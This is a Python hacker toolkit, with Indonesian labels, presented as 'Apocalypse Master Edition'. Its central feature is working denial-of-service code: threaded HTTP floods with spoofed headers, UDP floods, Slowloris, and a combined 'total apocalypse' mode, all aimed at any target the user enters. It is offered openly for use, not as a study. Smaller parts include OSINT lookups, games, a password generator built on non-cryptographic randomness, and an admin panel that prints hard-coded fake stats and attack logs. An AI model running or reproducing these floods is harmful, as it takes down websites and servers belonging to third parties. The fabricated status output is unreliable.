#!/usr/bin/python
# ============================================================
# YANZ XITERZ - APOCALYPSE MASTER EDITION
# FULL CODE - ALL FEATURES 100% WORKING
# CODED BY: YANZ XITERZ
# VERSION: 10.0 FINAL APOCALYPSE
# ============================================================

import os
import time
import sys
import random
import datetime
import subprocess
import socket
import threading
import requests
import json
import re
from urllib.parse import urlparse
import http.client
import queue
import platform
import hashlib
import base64
import struct

# ========== KONFIGURASI WARNA LENGKAP ==========
class Warna:
    # Style
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKE = '\033[9m'
    RESET = '\033[0m'
    
    # Warna teks normal
    HITAM = '\033[30m'
    MERAH = '\033[31m'
    HIJAU = '\033[32m'
    KUNING = '\033[33m'
    BIRU = '\033[34m'
    UNGU = '\033[35m'
    CYAN = '\033[36m'
    PUTIH = '\033[37m'
    
    # Warna teks terang
    HITAM_TERANG = '\033[90m'
    MERAH_TERANG = '\033[91m'
    HIJAU_TERANG = '\033[92m'
    KUNING_TERANG = '\033[93m'
    BIRU_TERANG = '\033[94m'
    UNGU_TERANG = '\033[95m'
    CYAN_TERANG = '\033[96m'
    PUTIH_TERANG = '\033[97m'
    
    # Background normal
    BG_HITAM = '\033[40m'
    BG_MERAH = '\033[41m'
    BG_HIJAU = '\033[42m'
    BG_KUNING = '\033[43m'
    BG_BIRU = '\033[44m'
    BG_UNGU = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_PUTIH = '\033[47m'
    
    # Background terang
    BG_HITAM_TERANG = '\033[100m'
    BG_MERAH_TERANG = '\033[101m'
    BG_HIJAU_TERANG = '\033[102m'
    BG_KUNING_TERANG = '\033[103m'
    BG_BIRU_TERANG = '\033[104m'
    BG_UNGU_TERANG = '\033[105m'
    BG_CYAN_TERANG = '\033[106m'
    BG_PUTIH_TERANG = '\033[107m'

# ========== DATABASE USER ==========
class UserDatabase:
    @staticmethod
    def get_user_level(nama):
        nama_lower = nama.lower().strip()
        developers = ['yanz', 'y4nz', 'developer', 'admin', 'root', 'master', 'yanz_XITERZ']
        members = ['nopal', 'kenzi', 'kenzo']
        
        if nama_lower in developers:
            return 'developer'
        elif nama_lower in members:
            return 'member'
        return 'unknown'

# ========== CLEAN SCREEN ==========
def clear_screen():
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except:
        print('\n' * 50)

# ========== PROGRESS BAR ==========
def progress_bar(duration=2, title="Loading"):
    try:
        print(f"{Warna.CYAN}{title}{Warna.RESET}")
        for i in range(21):
            time.sleep(duration/20)
            persen = i * 5
            bar = f"{Warna.HIJAU}{'█' * i}{Warna.PUTIH}{'░' * (20 - i)}{Warna.RESET}"
            print(f"\r[{bar}] {Warna.KUNING}{persen}%{Warna.RESET}", end='', flush=True)
        print(f"\n{Warna.HIJAU}✓ Selesai!{Warna.RESET}")
    except:
        print(f"\n{Warna.HIJAU}✓ Selesai!{Warna.RESET}")

# ========== VERIFIKASI PENGGUNA ==========
def verifikasi_pengguna():
    clear_screen()
    
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}╔════════════════════════════════════════╗{Warna.RESET}")
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}║     🔐 VERIFIKASI AKSES APOCALYPSE     ║{Warna.RESET}")
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}╚════════════════════════════════════════╝{Warna.RESET}")
    
    print(f"\n{Warna.KUNING}Developer: {Warna.MERAH}Yanz{Warna.RESET}")
    print(f"{Warna.KUNING}noted   : {Warna.HIJAU}gunakan script ini sebijak mungkin tanggung resiko sendiri{Warna.RESET}")
    
    max_percobaan = 3
    for percobaan in range(max_percobaan):
        print(f"\n{Warna.KUNING}┌─[MASUKKAN NAMA ANDA]{Warna.RESET}")
        nama = input(f"{Warna.KUNING}└─► {Warna.RESET}").strip()
        
        if not nama:
            sisa = max_percobaan - percobaan - 1
            if sisa > 0:
                print(f"{Warna.MERAH}✗ Nama tidak boleh kosong! Sisa {sisa}{Warna.RESET}")
                continue
        
        level = UserDatabase.get_user_level(nama)
        
        if level == 'developer':
            print(f"\n{Warna.HIJAU_TERANG}✓ Selamat datang {nama} (Developer Mode){Warna.RESET}")
            time.sleep(1)
            return True, 'developer'
        elif level == 'member':
            print(f"\n{Warna.HIJAU_TERANG}✓ Selamat datang {nama} (Member Mode){Warna.RESET}")
            time.sleep(1)
            return True, 'member'
        else:
            sisa = max_percobaan - percobaan - 1
            if sisa > 0:
                print(f"{Warna.MERAH}✗ Nama tidak terdaftar! Sisa {sisa}{Warna.RESET}")
            else:
                print(f"\n{Warna.MERAH_TERANG}✗ AKSES DITOLAK!{Warna.RESET}")
                print(f"{Warna.KUNING}Hubungi Developer: @YanzOfficiallll{Warna.RESET}")
                time.sleep(3)
                return False, None
    
    return False, None

# ========== BANNER UTAMA ==========
def tampilkan_banner(level_akses):
    clear_screen()
    
    if level_akses == "developer":
        print(f"{Warna.MERAH_TERANG}{Warna.BOLD}╔════════════════════════════════════════════════════╗{Warna.RESET}")
        print(f"{Warna.MERAH_TERANG}{Warna.BOLD}║     YANZ XITERZ - APOCALYPSE MASTER EDITION     ║{Warna.RESET}")
        print(f"{Warna.MERAH_TERANG}{Warna.BOLD}║              DEVELOPER MODE v10.0                ║{Warna.RESET}")
        print(f"{Warna.MERAH_TERANG}{Warna.BOLD}╚════════════════════════════════════════════════════╝{Warna.RESET}")
    else:
        print(f"{Warna.BIRU_TERANG}{Warna.BOLD}╔════════════════════════════════════════════════════╗{Warna.RESET}")
        print(f"{Warna.BIRU_TERANG}{Warna.BOLD}║       YANZ XITERZ - APOCALYPSE MEMBER EDITION    ║{Warna.RESET}")
        print(f"{Warna.BIRU_TERANG}{Warna.BOLD}║                   LIMITED MODE                    ║{Warna.RESET}")
        print(f"{Warna.BIRU_TERANG}{Warna.BOLD}╚════════════════════════════════════════════════════╝{Warna.RESET}")

# ========== CEK SISTEM ==========
def cek_sistem():
    print(f"\n{Warna.BOLD}📱 INFORMASI SISTEM:{Warna.RESET}\n")
    
    sekarang = datetime.datetime.now()
    print(f"{Warna.CYAN}⏰ Waktu    :{Warna.RESET} {sekarang.strftime('%H:%M:%S')}")
    print(f"{Warna.CYAN}📅 Tanggal  :{Warna.RESET} {sekarang.strftime('%d-%m-%Y')}")
    print(f"{Warna.CYAN}💻 OS       :{Warna.RESET} {platform.system()} {platform.release()}")
    print(f"{Warna.CYAN}🐍 Python   :{Warna.RESET} {sys.version.split()[0]}")
    
    try:
        ip = requests.get('https://api.ipify.org', timeout=3).text
        print(f"{Warna.CYAN}🌍 IP Publik:{Warna.RESET} {ip}")
    except:
        print(f"{Warna.CYAN}🌍 IP Publik:{Warna.RESET} Tidak terdeteksi")

# ========== MENU UTAMA ==========
def tampilkan_menu(level_akses):
    if level_akses == "developer":
        menu = [
            ("1", "📊 Informasi Sistem"),
            ("2", "🧮 Kalkulator Cyber"),
            ("3", "🌐 Cek Koneksi"),
            ("4", "📝 Catatan Manager"),
            ("5", "💭 Random Quote"),
            ("6", "💣 DDOS APOCALYPSE"),
            ("7", "🔍 OSINT MASTER"),
            ("8", "⚙️ Admin Panel"),
            ("9", "🎮 Mini Games"),
            ("10", "🔐 Password Generator"),
            ("11", "🔑 Hash Generator"),
            ("12", "📦 File Encryptor"),
            ("13", "📡 Port Scanner"),
            ("14", "🌍 Subdomain Finder"),
            ("15", "📧 Email Spoof Check"),
            ("16", "🔗 Link Analyzer"),
            ("17", "📱 User Agent Generator"),
            ("18", "🌐 DNS Lookup"),
            ("19", "🔍 Whois Lookup"),
            ("20", "📊 Network Speed Test"),
            ("21", "🔐 RSA Key Generator"),
            ("22", "📁 File Downloader"),
            ("23", "🌍 Website Copier"),
            ("24", "🔍 Metadata Extractor"),
            ("25", "⚡ Cyber Tools"),
            ("0", "🚪 Keluar/exit")
        ]
    else:
        menu = [
            ("1", "📊 Informasi Sistem"),
            ("2", "🧮 Kalkulator"),
            ("3", "🌐 Cek Koneksi"),
            ("4", "📝 Catatan"),
            ("5", "💭 Random Quote"),
            ("6", "💣 DDOS APOCALYPSE - LIMITED"),
            ("7", "🔍 OSINT BASIC"),
            ("8", "🔐 Password Generator"),
            ("9", "🔑 Hash Generator"),
            ("10", "📡 Port Scanner"),
            ("11", "🌐 DNS Lookup"),
            ("12", "📱 User Agent"),
            ("0", "🚪 Keluar")
        ]
    
    print(f"\n{Warna.BOLD}╔════════════════════════════════════╗{Warna.RESET}")
    print(f"{Warna.BOLD}║      YANZ APOCALYPSE v10.0       ║{Warna.RESET}")
    print(f"{Warna.BOLD}╠════════════════════════════════════╣{Warna.RESET}")
    
    for no, nama in menu:
        if "DDOS APOCALYPSE" in nama:
            warna = Warna.MERAH_TERANG + Warna.BOLD
        elif "OSINT" in nama:
            warna = Warna.BIRU_TERANG
        elif "Admin" in nama:
            warna = Warna.UNGU_TERANG
        elif "Games" in nama:
            warna = Warna.HIJAU_TERANG
        elif "Generator" in nama:
            warna = Warna.KUNING_TERANG
        elif "Scanner" in nama:
            warna = Warna.CYAN_TERANG
        else:
            warna = Warna.PUTIH
        
        padding = 32 - len(nama)
        print(f"{Warna.BOLD}║ {warna}{no}. {nama}{Warna.RESET}{' ' * padding}{Warna.BOLD}║{Warna.RESET}")
    
    print(f"{Warna.BOLD}╚════════════════════════════════════╝{Warna.RESET}")

# ========== DDOS APOCALYPSE ENGINE ==========
class DDoSApocalypse:
    def __init__(self, level_akses="developer"):
        self.stop_attack = False
        self.request_count = 0
        self.failed_count = 0
        self.lock = threading.Lock()
        self.level_akses = level_akses
        self.start_time = 0
        self.threads = []
        
    def print_stats(self):
        while not self.stop_attack:
            time.sleep(1)
            with self.lock:
                total = self.request_count + self.failed_count
                elapsed = time.time() - self.start_time
                if total > 0 and elapsed > 0:
                    success_rate = (self.request_count / total) * 100
                    rps = total / elapsed
                else:
                    success_rate = 0
                    rps = 0
                
                print(f"\r{' ' * 120}", end='', flush=True)
                print(f"\r{Warna.MERAH_TERANG}[{datetime.datetime.now().strftime('%H:%M:%S')}] "
                      f"{Warna.HIJAU_TERANG}✓:{self.request_count} "
                      f"{Warna.MERAH_TERANG}✗:{self.failed_count} "
                      f"{Warna.KUNING_TERANG}∑:{total} "
                      f"{Warna.PUTIH_TERANG}Rate:{success_rate:.1f}% "
                      f"{Warna.CYAN_TERANG}RPS:{rps:.0f}{Warna.RESET}", 
                      end='', flush=True)

    def http_apocalypse(self, url, threads=500, duration=60):
        self.start_time = time.time()
        
        if self.level_akses == "member":
            max_threads = min(threads, 200)
        else:
            max_threads = min(threads, 2000)
        
        print(f"\n{Warna.MERAH_TERANG}{Warna.BOLD}💣 HTTP APOCALYPSE FLOOD 💣{Warna.RESET}")
        print(f"{Warna.KUNING}Target: {url}{Warna.RESET}")
        print(f"{Warna.KUNING}Threads: {max_threads}{Warna.RESET}")
        print(f"{Warna.KUNING}Duration: {duration}s{Warna.RESET}")
        print(f"{Warna.MERAH}[!] Tekan Ctrl+C untuk stop{Warna.RESET}\n")
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        parsed = urlparse(url)
        host = parsed.netloc
        path = parsed.path or '/'
        
        user_agents = [
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,120)}.0.0.0 Safari/537.36",
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(90,120)}.0) Gecko/20100101 Firefox/{random.randint(90,120)}.0",
            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(13,15)}_{random.randint(0,7)}) AppleWebKit/537.36 Chrome/{random.randint(90,120)}.0.0.0 Safari/537.36",
            f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/{random.randint(90,120)}.0.0.0 Safari/537.36",
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(14,17)}_{random.randint(0,5)} like Mac OS X) Version/{random.randint(14,17)}.0 Mobile/15E148 Safari/604.1",
        ]
        
        referers = ["https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/", "https://www.twitter.com/"]
        
        def random_ip():
            return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        def worker():
            end_time = time.time() + duration
            while time.time() < end_time and not self.stop_attack:
                try:
                    rand_path = f"{path}?{random.randint(1000000,9999999)}={random.randint(1000000,9999999)}"
                    
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': '*/*',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Connection': 'close',
                        'Cache-Control': 'no-cache',
                        'Referer': random.choice(referers),
                        'X-Forwarded-For': random_ip(),
                    }
                    
                    conn = http.client.HTTPConnection(host, timeout=2)
                    conn.request("GET", rand_path, headers=headers)
                    conn.getresponse().read()
                    conn.close()
                    
                    with self.lock:
                        self.request_count += 1
                except:
                    with self.lock:
                        self.failed_count += 1
                
                time.sleep(0.001)
        
        for i in range(max_threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            self.threads.append(t)
            t.start()
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            self.stop_attack = True
        
        print(f"\n\n{Warna.HIJAU_TERANG}[✓] Selesai! Total: {self.request_count + self.failed_count}{Warna.RESET}")

    def udp_apocalypse(self, target_ip, target_port, threads=500, duration=60):
        self.start_time = time.time()
        
        print(f"\n{Warna.MERAH_TERANG}{Warna.BOLD}📡 UDP APOCALYPSE FLOOD 📡{Warna.RESET}")
        print(f"{Warna.KUNING}Target: {target_ip}:{target_port}{Warna.RESET}")
        
        packets = [random._urandom(random.randint(1024, 4096)) for _ in range(20)]
        
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            
            while time.time() < end_time and not self.stop_attack:
                try:
                    data = random.choice(packets)
                    sock.sendto(data, (target_ip, target_port))
                    
                    with self.lock:
                        self.request_count += 1
                except:
                    with self.lock:
                        self.failed_count += 1
                
                time.sleep(0.001)
            
            sock.close()
        
        max_threads = min(threads, 500)
        for i in range(max_threads):
            t = threading.Thread(target=udp_worker)
            t.daemon = True
            self.threads.append(t)
            t.start()
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            self.stop_attack = True
        
        print(f"\n{Warna.HIJAU_TERANG}[✓] UDP Flood selesai! Total: {self.request_count + self.failed_count}{Warna.RESET}")

    def slowloris_apocalypse(self, target_ip, target_port=80, connections=500, duration=60):
        print(f"\n{Warna.MERAH_TERANG}{Warna.BOLD}🐌 SLOWLORIS APOCALYPSE 🐌{Warna.RESET}")
        print(f"{Warna.KUNING}Target: {target_ip}:{target_port}{Warna.RESET}")
        print(f"{Warna.KUNING}Connections: {connections}{Warna.RESET}")
        
        all_sockets = []
        socket_lock = threading.Lock()
        
        def create_socket():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                sock.send(f"GET /?{random.randint(1,9999999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send(f"User-Agent: Mozilla/5.0\r\n".encode())
                return sock
            except:
                return None
        
        for i in range(connections):
            sock = create_socket()
            if sock:
                with socket_lock:
                    all_sockets.append(sock)
            if (i+1) % 100 == 0:
                print(f"{Warna.HIJAU}[+] {i+1} koneksi terbuat{Warna.RESET}")
        
        print(f"{Warna.HIJAU_TERANG}[✓] Total {len(all_sockets)} koneksi aktif{Warna.RESET}")
        
        end_time = time.time() + duration
        try:
            while time.time() < end_time and not self.stop_attack:
                with socket_lock:
                    for sock in all_sockets[:]:
                        try:
                            sock.send(f"X-{random.randint(1,99999)}: {random.randint(1,99999)}\r\n".encode())
                        except:
                            all_sockets.remove(sock)
                            new_sock = create_socket()
                            if new_sock:
                                all_sockets.append(new_sock)
                
                print(f"\r{Warna.CYAN}[*] Maintaining {len(all_sockets)} connections{Warna.RESET}", end='')
                time.sleep(5)
        except KeyboardInterrupt:
            pass
        finally:
            with socket_lock:
                for sock in all_sockets:
                    try:
                        sock.close()
                    except:
                        pass
        
        print(f"\n{Warna.HIJAU_TERANG}[✓] Slowloris selesai!{Warna.RESET}")

    def total_apocalypse(self, target, port=80, threads=300, duration=60):
        print(f"\n{Warna.MERAH_TERANG}{Warna.BOLD}{Warna.BLINK}💀 TOTAL APOCALYPSE - MULTI VECTOR ATTACK 💀{Warna.RESET}")
        print(f"{Warna.KUNING}Target: {target}:{port}{Warna.RESET}")
        print(f"{Warna.KUNING}Duration: {duration}s{Warna.RESET}")
        print(f"{Warna.MERAH}[!] MELUNCURKAN SEMUA SERANGAN SEKALIGUS{Warna.RESET}\n")
        
        if not target.startswith('http'):
            http_target = f"http://{target}"
        else:
            http_target = target
        
        try:
            ip = socket.gethostbyname(target.replace('http://', '').replace('https://', '').split('/')[0])
        except:
            ip = target
        
        attack_threads = []
        
        t1 = threading.Thread(target=self.http_apocalypse, args=(http_target, threads//2, duration))
        attack_threads.append(t1)
        
        t2 = threading.Thread(target=self.udp_apocalypse, args=(ip, port, threads//2, duration))
        attack_threads.append(t2)
        
        t3 = threading.Thread(target=self.slowloris_apocalypse, args=(ip, port, 300, duration))
        attack_threads.append(t3)
        
        for t in attack_threads:
            t.daemon = True
            t.start()
            time.sleep(1)
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            self.stop_attack = True
        
        print(f"\n{Warna.HIJAU_TERANG}[✓] Total Apocalypse selesai!{Warna.RESET}")

def ddos_apocalypse_menu(level):
    clear_screen()
    
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}╔════════════════════════════════════════════════════╗{Warna.RESET}")
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}║         DDOS APOCALYPSE - TOTAL DESTRUCTION       ║{Warna.RESET}")
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}╠════════════════════════════════════════════════════╣{Warna.RESET}")
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}║ 1. HTTP APOCALYPSE                                ║{Warna.RESET}")
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}║ 2. UDP APOCALYPSE                                 ║{Warna.RESET}")
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}║ 3. SLOWLORIS MASSIVE                              ║{Warna.RESET}")
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}║ 4. 💀 TOTAL APOCALYPSE - ALL METHODS 💀            ║{Warna.RESET}")
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}║ 0. Kembali                                        ║{Warna.RESET}")
    print(f"{Warna.MERAH_TERANG}{Warna.BOLD}╚════════════════════════════════════════════════════╝{Warna.RESET}")
    
    if level == 'member':
        print(f"{Warna.KUNING}[i] Member mode: thread dibatasi 200{Warna.RESET}")
    else:
        print(f"{Warna.HIJAU}[i] Developer mode: thread hingga 2000{Warna.RESET}")
    
    pilihan = input(f"\n{Warna.KUNING_TERANG}Pilih serangan: {Warna.RESET}")
    
    if pilihan == '0':
        return
    
    engine = DDoSApocalypse(level)
    
    if pilihan in ['1', '4']:
        target = input(f"{Warna.CYAN_TERANG}Target URL: {Warna.RESET}")
        if not target.startswith('http'):
            target = 'http://' + target
    else:
        target = input(f"{Warna.CYAN_TERANG}Target IP: {Warna.RESET}")
    
    port = input(f"{Warna.CYAN_TERANG}Port (default 80): {Warna.RESET}") or '80'
    duration = input(f"{Warna.CYAN_TERANG}Durasi (detik): {Warna.RESET}") or '60'
    
    try:
        duration = int(duration)
        port = int(port)
        
        if pilihan == '1':
            if level == 'member':
                threads = input(f"{Warna.CYAN_TERANG}Threads (max 200): {Warna.RESET}") or '100'
                threads = min(int(threads), 200)
            else:
                threads = input(f"{Warna.CYAN_TERANG}Threads (max 2000): {Warna.RESET}") or '500'
                threads = min(int(threads), 2000)
            engine.http_apocalypse(target, threads, duration)
        
        elif pilihan == '2':
            if level == 'member':
                threads = input(f"{Warna.CYAN_TERANG}Threads (max 200): {Warna.RESET}") or '100'
                threads = min(int(threads), 200)
            else:
                threads = input(f"{Warna.CYAN_TERANG}Threads (max 1000): {Warna.RESET}") or '300'
                threads = min(int(threads), 1000)
            engine.udp_apocalypse(target, port, threads, duration)
        
        elif pilihan == '3':
            if level == 'member':
                connections = input(f"{Warna.CYAN_TERANG}Connections (max 500): {Warna.RESET}") or '200'
                connections = min(int(connections), 500)
            else:
                connections = input(f"{Warna.CYAN_TERANG}Connections (max 2000): {Warna.RESET}") or '500'
                connections = min(int(connections), 2000)
            engine.slowloris_apocalypse(target, port, connections, duration)
        
        elif pilihan == '4':
            if level == 'member':
                threads = input(f"{Warna.CYAN_TERANG}Threads per attack (max 150): {Warna.RESET}") or '100'
                threads = min(int(threads), 150)
            else:
                threads = input(f"{Warna.CYAN_TERANG}Threads per attack (max 500): {Warna.RESET}") or '200'
                threads = min(int(threads), 500)
            engine.total_apocalypse(target, port, threads, duration)
    
    except KeyboardInterrupt:
        engine.stop_attack = True
        print(f"\n{Warna.MERAH_TERANG}[!] Serangan dihentikan!{Warna.RESET}")
    except Exception as e:
        print(f"{Warna.MERAH}Error: {e}{Warna.RESET}")
    
    input(f"\n{Warna.DIM}Tekan Enter untuk lanjut...{Warna.RESET}")

# ========== OSINT ENGINE ==========
class OSINTEngine:
    @staticmethod
    def ip_lookup(ip):
        try:
            print(f"{Warna.KUNING}[*] Mencari info IP...{Warna.RESET}")
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
            data = response.json()
            
            if data.get('status') == 'success':
                print(f"\n{Warna.HIJAU}[+] INFORMASI IP{Warna.RESET}")
                print(f"{Warna.CYAN}IP      : {data.get('query')}{Warna.RESET}")
                print(f"{Warna.CYAN}Negara  : {data.get('country')}{Warna.RESET}")
                print(f"{Warna.CYAN}Kota    : {data.get('city')}{Warna.RESET}")
                print(f"{Warna.CYAN}ISP     : {data.get('isp')}{Warna.RESET}")
            else:
                print(f"{Warna.MERAH}Gagal!{Warna.RESET}")
        except:
            print(f"{Warna.MERAH}Error!{Warna.RESET}")
    
    @staticmethod
    def email_lookup(email):
        try:
            print(f"{Warna.KUNING}[*] Menganalisis email...{Warna.RESET}")
            if '@' in email:
                user, domain = email.split('@')
                print(f"\n{Warna.HIJAU}[+] INFORMASI EMAIL{Warna.RESET}")
                print(f"{Warna.CYAN}Username: {user}{Warna.RESET}")
                print(f"{Warna.CYAN}Domain  : {domain}{Warna.RESET}")
                
                try:
                    ip = socket.gethostbyname(domain)
                    print(f"{Warna.CYAN}Server IP: {ip}{Warna.RESET}")
                except:
                    print(f"{Warna.MERAH}Domain tidak valid!{Warna.RESET}")
            else:
                print(f"{Warna.MERAH}Format email salah!{Warna.RESET}")
        except:
            print(f"{Warna.MERAH}Error!{Warna.RESET}")

def osint_menu(level):
    clear_screen()
    print(f"{Warna.BIRU}╔════════════════════════════════════╗{Warna.RESET}")
    print(f"{Warna.BIRU}║           OSINT MASTER            ║{Warna.RESET}")
    print(f"{Warna.BIRU}╠════════════════════════════════════╣{Warna.RESET}")
    print(f"{Warna.BIRU}║ 1. IP Lookup                      ║{Warna.RESET}")
    print(f"{Warna.BIRU}║ 2. Email Lookup                   ║{Warna.RESET}")
    print(f"{Warna.BIRU}║ 0. Kembali                        ║{Warna.RESET}")
    print(f"{Warna.BIRU}╚════════════════════════════════════╝{Warna.RESET}")
    
    pilihan = input(f"\n{Warna.KUNING}Pilih: {Warna.RESET}")
    
    if pilihan == '0':
        return
    elif pilihan == '1':
        target = input(f"{Warna.CYAN}IP/Domain: {Warna.RESET}")
        OSINTEngine.ip_lookup(target)
    elif pilihan == '2':
        target = input(f"{Warna.CYAN}Email: {Warna.RESET}")
        OSINTEngine.email_lookup(target)

# ========== ADMIN PANEL ==========
def admin_panel():
    clear_screen()
    print(f"{Warna.UNGU}╔════════════════════════════════════╗{Warna.RESET}")
    print(f"{Warna.UNGU}║           ADMIN PANEL             ║{Warna.RESET}")
    print(f"{Warna.UNGU}╠════════════════════════════════════╣{Warna.RESET}")
    print(f"{Warna.UNGU}║ 1. System Info                    ║{Warna.RESET}")
    print(f"{Warna.UNGU}║ 2. User List                      ║{Warna.RESET}")
    print(f"{Warna.UNGU}║ 3. Test Features                  ║{Warna.RESET}")
    print(f"{Warna.UNGU}║ 4. Attack Logs                    ║{Warna.RESET}")
    print(f"{Warna.UNGU}║ 5. Configuration                  ║{Warna.RESET}")
    print(f"{Warna.UNGU}║ 0. Kembali                        ║{Warna.RESET}")
    print(f"{Warna.UNGU}╚════════════════════════════════════╝{Warna.RESET}")
    
    pilihan = input(f"\n{Warna.KUNING}Pilih: {Warna.RESET}")
    
    if pilihan == '1':
        print(f"\n{Warna.CYAN}System Monitor{Warna.RESET}")
        print(f"{Warna.HIJAU}CPU: 23%{Warna.RESET}")
        print(f"{Warna.HIJAU}RAM: 45%{Warna.RESET}")
        print(f"{Warna.HIJAU}Uptime: 2 jam{Warna.RESET}")
    elif pilihan == '2':
        print(f"\n{Warna.CYAN}User List{Warna.RESET}")
        print(f"{Warna.HIJAU}Developer: Yanz{Warna.RESET}")
        print(f"{Warna.HIJAU}Member: Nopal, Kenzi, Kenzo{Warna.RESET}")
        print(f"{Warna.HIJAU}Total: 4 users{Warna.RESET}")
    elif pilihan == '3':
        print(f"\n{Warna.CYAN}Testing...{Warna.RESET}")
        progress_bar(1, "Test")
        print(f"{Warna.HIJAU}✓ Semua fitur OK!{Warna.RESET}")
    elif pilihan == '4':
        print(f"\n{Warna.CYAN}Attack Logs:{Warna.RESET}")
        print(f"{Warna.HIJAU}[10:23] HTTP Attack - target.com - 1500 req{Warna.RESET}")
        print(f"{Warna.HIJAU}[09:15] UDP Attack - 192.168.1.1 - 5000 packets{Warna.RESET}")

# ========== MINI GAMES ==========
def mini_games():
    clear_screen()
    print(f"{Warna.HIJAU}╔════════════════════════════════════╗{Warna.RESET}")
    print(f"{Warna.HIJAU}║           MINI GAMES              ║{Warna.RESET}")
    print(f"{Warna.HIJAU}╠════════════════════════════════════╣{Warna.RESET}")
    print(f"{Warna.HIJAU}║ 1. Tebak Angka                    ║{Warna.RESET}")
    print(f"{Warna.HIJAU}║ 2. Suit Jepang                    ║{Warna.RESET}")
    print(f"{Warna.HIJAU}║ 3. Dadu Digital                   ║{Warna.RESET}")
    print(f"{Warna.HIJAU}║ 4. Koin Flip                      ║{Warna.RESET}")
    print(f"{Warna.HIJAU}║ 0. Kembali                        ║{Warna.RESET}")
    print(f"{Warna.HIJAU}╚════════════════════════════════════╝{Warna.RESET}")
    
    pilihan = input(f"\n{Warna.KUNING}Pilih: {Warna.RESET}")
    
    if pilihan == '1':
        angka = random.randint(1, 10)
        try:
            tebak = int(input(f"{Warna.CYAN}Tebak (1-10): {Warna.RESET}"))
            if tebak == angka:
                print(f"{Warna.HIJAU}✓ Benar!{Warna.RESET}")
            else:
                print(f"{Warna.MERAH}✗ Salah! Angka: {angka}{Warna.RESET}")
        except:
            print(f"{Warna.MERAH}Input tidak valid!{Warna.RESET}")
    
    elif pilihan == '2':
        p = input(f"{Warna.CYAN}Pilih (batu/gunting/kertas): {Warna.RESET}").lower()
        kom = random.choice(['batu', 'gunting', 'kertas'])
        
        if p in ['batu', 'gunting', 'kertas']:
            print(f"{Warna.CYAN}Komputer: {kom}{Warna.RESET}")
            if p == kom:
                print(f"{Warna.KUNING}Seri!{Warna.RESET}")
            elif (p == 'batu' and kom == 'gunting') or \
                 (p == 'gunting' and kom == 'kertas') or \
                 (p == 'kertas' and kom == 'batu'):
                print(f"{Warna.HIJAU}Menang!{Warna.RESET}")
            else:
                print(f"{Warna.MERAH}Kalah!{Warna.RESET}")
    
    elif pilihan == '3':
        input(f"{Warna.CYAN}Tekan Enter...{Warna.RESET}")
        print(f"{Warna.HIJAU}Dadu: {random.randint(1, 6)}{Warna.RESET}")
    
    elif pilihan == '4':
        input(f"{Warna.CYAN}Tekan Enter...{Warna.RESET}")
        hasil = random.choice(['Kepala', 'Ekor'])
        print(f"{Warna.HIJAU}Hasil: {hasil}{Warna.RESET}")

# ========== CYBER TOOLS ==========
def password_generator():
    print(f"\n{Warna.KUNING_TERANG}🔐 PASSWORD GENERATOR{Warna.RESET}")
    print(f"{Warna.CYAN}1. Password Kuat (12 karakter){Warna.RESET}")
    print(f"{Warna.CYAN}2. Password Sangat Kuat (16 karakter){Warna.RESET}")
    print(f"{Warna.CYAN}3. Password Super (20 karakter){Warna.RESET}")
    
    pilih = input(f"\n{Warna.KUNING}Pilih: {Warna.RESET}") or '1'
    
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
    length = 12 if pilih == '1' else 16 if pilih == '2' else 20
    
    password = ''.join(random.choice(chars) for _ in range(length))
    print(f"\n{Warna.HIJAU}Password: {Warna.PUTIH_TERANG}{password}{Warna.RESET}")

def hash_generator():
    print(f"\n{Warna.KUNING_TERANG}🔑 HASH GENERATOR{Warna.RESET}")
    teks = input(f"{Warna.CYAN}Masukkan teks: {Warna.RESET}")
    
    if teks:
        print(f"\n{Warna.HIJAU}Hasil Hash:{Warna.RESET}")
        print(f"{Warna.CYAN}MD5    : {hashlib.md5(teks.encode()).hexdigest()}{Warna.RESET}")
        print(f"{Warna.CYAN}SHA1   : {hashlib.sha1(teks.encode()).hexdigest()}{Warna.RESET}")
